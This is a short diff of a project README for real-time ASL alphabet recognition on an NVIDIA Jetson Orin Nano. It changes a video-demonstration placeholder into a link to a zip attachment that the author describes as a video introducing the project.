@@ -51,5 +51,5 @@ Connect a USB webcam to the NVIDIA Jetson Orin Nano and verify that it is detect
 python3 inference.py
 The webcam window will open and begin recognizing ASL alphabet gestures in real time. The predicted letter will appear on the screen as you perform each sign.
 
-Video Demonstration
-View a video explanation here
+[2026-07-30 11-37-17.zip](https://github.com/user-attachments/files/30558192/2026-07-30.11-37-17.zip)
+here is the video introducing my project.
